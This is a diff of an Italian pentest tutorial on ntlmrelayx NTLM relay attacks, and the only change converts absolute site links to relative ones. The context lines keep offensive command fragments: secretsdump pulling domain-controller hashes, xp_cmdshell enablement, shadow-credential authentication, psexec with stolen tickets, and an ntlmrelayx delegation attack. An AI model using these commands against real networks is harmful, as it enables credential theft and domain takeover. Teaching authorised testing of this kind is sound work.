@@ -21,7 +21,7 @@ tags:
 
 > **TL;DR:** `ntlmrelayx.py` intercetta autenticazioni NTLM e le rilancia verso un servizio target senza conoscere la password. Con coercizione forzata, puoi far autenticare un Domain Controller verso di te e arrivare a Domain Admin in pochi minuti — sfruttando misconfiguration, non zero-day.
 
-`ntlmrelayx.py` fa parte di [Impacket](https://hackita.it/articoli/impacket/) ed è lo strumento più completo per attacchi NTLM relay. Non è uno strumento singolo: è un sistema a tre layer. Capire questa architettura è quello che separa chi usa ntlmrelayx meccanicamente da chi sa perché ogni relay funziona o fallisce.
+`ntlmrelayx.py` fa parte di [Impacket](/articoli/impacket/) ed è lo strumento più completo per attacchi NTLM relay. Non è uno strumento singolo: è un sistema a tre layer. Capire questa architettura è quello che separa chi usa ntlmrelayx meccanicamente da chi sa perché ogni relay funziona o fallisce.
 
 Riferimento ufficiale: [fortra/impacket — ntlmrelayx.py](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)\
 MITRE ATT\&CK: [T1557.001 — LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001/)
@@ -347,7 +347,7 @@ certipy find -u user@corp.local -p pass -dc-ip 10.10.10.5 -stdout | grep -i "enf
 
 ### Responder — LLMNR/NBT-NS poisoning (passivo)
 
-[Responder](https://hackita.it/articoli/responder/) avvelena le risoluzioni DNS fallite. Quando un host non trova `\\TYPO` via DNS, manda un broadcast LLMNR — Responder risponde e cattura l'autenticazione. **Devi** disabilitare SMB e HTTP perché ntlmrelayx deve gestire quelle porte.
+[Responder](/articoli/responder/) avvelena le risoluzioni DNS fallite. Quando un host non trova `\\TYPO` via DNS, manda un broadcast LLMNR — Responder risponde e cattura l'autenticazione. **Devi** disabilitare SMB e HTTP perché ntlmrelayx deve gestire quelle porte.
 
 ```bash
 # Configura Responder
@@ -584,7 +584,7 @@ export KRB5CCNAME=Administrator.ccache
 impacket-psexec -k -no-pass corp.local/Administrator@WS01.corp.local
 ```
 
-Flusso completo in [RBCD](https://hackita.it/articoli/rbcd/) e [getST.py](https://hackita.it/articoli/getst/).
+Flusso completo in [RBCD](/articoli/rbcd/) e [getST.py](/articoli/getst/).
 
 ***
 
@@ -609,7 +609,7 @@ certipy auth -pfx /tmp/ws01_shadow.pfx -dc-ip 10.10.10.5 -username 'WS01$' -doma
 # → restituisce direttamente NT hash + TGT
 ```
 
-Dettagli in [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/).
+Dettagli in [Shadow Credentials](/articoli/shadow-credentials/).
 
 ***
 
@@ -655,7 +655,7 @@ KRB5CCNAME=dc01.ccache impacket-secretsdump -k -no-pass \
   -just-dc-ntlm corp.local/'DC01$'@DC01.corp.local
 ```
 
-Percorso ADCS completo in [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/).
+Percorso ADCS completo in [ADCS ESC1-ESC16](/articoli/adcs-esc1-esc16/).
 
 ***
 
@@ -697,7 +697,7 @@ SQL> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 SQL> EXEC xp_cmdshell 'whoami';
 ```
 
-Approfondimento in [porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/).
+Approfondimento in [porta 1433 MSSQL](/articoli/porta-1433-mssql/).
 
 ***
 
@@ -913,19 +913,19 @@ sudo ntlmrelayx.py -6 -t ldaps://DC_IP --delegate-access -smb2support
 
 **Articoli correlati:**
 
-* [Impacket: suite completa](https://hackita.it/articoli/impacket/)
-* [Responder: LLMNR/NBT-NS poisoning](https://hackita.it/articoli/responder/)
-* [SMB — porta 445 e attacchi](https://hackita.it/articoli/smb/)
-* [RBCD — Resource-Based Constrained Delegation](https://hackita.it/articoli/rbcd/)
-* [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/)
-* [getST.py — S4U2Self/S4U2Proxy](https://hackita.it/articoli/getst/)
-* [ADCS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/)
-* [DCSync](https://hackita.it/articoli/dcsync/)
-* [addcomputer.py](https://hackita.it/articoli/addcomputer/)
-* [Man-in-the-Middle: tecniche e tool](https://hackita.it/articoli/man-in-the-middle/)
-* [Active Directory: exploitation](https://hackita.it/articoli/active-directory/)
-* [secretsdump.py](https://hackita.it/articoli/secretsdump/)
-* [Porta 1433 MSSQL](https://hackita.it/articoli/porta-1433-mssql/)
+* [Impacket: suite completa](/articoli/impacket/)
+* [Responder: LLMNR/NBT-NS poisoning](/articoli/responder/)
+* [SMB — porta 445 e attacchi](/articoli/smb/)
+* [RBCD — Resource-Based Constrained Delegation](/articoli/rbcd/)
+* [Shadow Credentials](/articoli/shadow-credentials/)
+* [getST.py — S4U2Self/S4U2Proxy](/articoli/getst/)
+* [ADCS ESC1-ESC16](/articoli/adcs-esc1-esc16/)
+* [DCSync](/articoli/dcsync/)
+* [addcomputer.py](/articoli/addcomputer/)
+* [Man-in-the-Middle: tecniche e tool](/articoli/man-in-the-middle/)
+* [Active Directory: exploitation](/articoli/active-directory/)
+* [secretsdump.py](/articoli/secretsdump/)
+* [Porta 1433 MSSQL](/articoli/porta-1433-mssql/)
 
 > Uso esclusivo in ambienti autorizzati.
 
